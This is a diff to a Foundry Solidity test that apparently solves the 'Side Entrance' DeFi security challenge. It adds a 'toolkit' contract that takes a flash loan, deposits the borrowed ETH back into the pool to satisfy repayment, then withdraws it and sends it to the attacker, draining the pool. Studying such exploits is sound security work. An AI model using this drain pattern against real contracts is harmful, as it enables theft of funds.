@@ -36,7 +36,9 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        toolkit tk = new toolkit();
+        address(tk).call(abi.encodeWithSelector(toolkit.start.selector, address(sideEntranceLenderPool)));
+        address(tk).call(abi.encodeWithSelector(toolkit.steal.selector, address(attacker)));
         /**
          * EXPLOIT END *
          */
@@ -48,4 +50,22 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+}
+
+contract toolkit {
+    address public p;
+    function start(address _pool) public {
+        p = _pool;
+        _pool.call(abi.encodeWithSelector(SideEntranceLenderPool.flashLoan.selector,1_000e18));
+    }
+
+    function execute() external payable {
+        p.call{value: 1_000e18}(abi.encodeWithSelector(SideEntranceLenderPool.deposit.selector));
+    }
+
+    function steal(address _attacker) public {
+        p.call(abi.encodeWithSelector(SideEntranceLenderPool.withdraw.selector));
+        _attacker.call{value: 1_000e18}("");
+    }
+    receive() external payable { }
 }
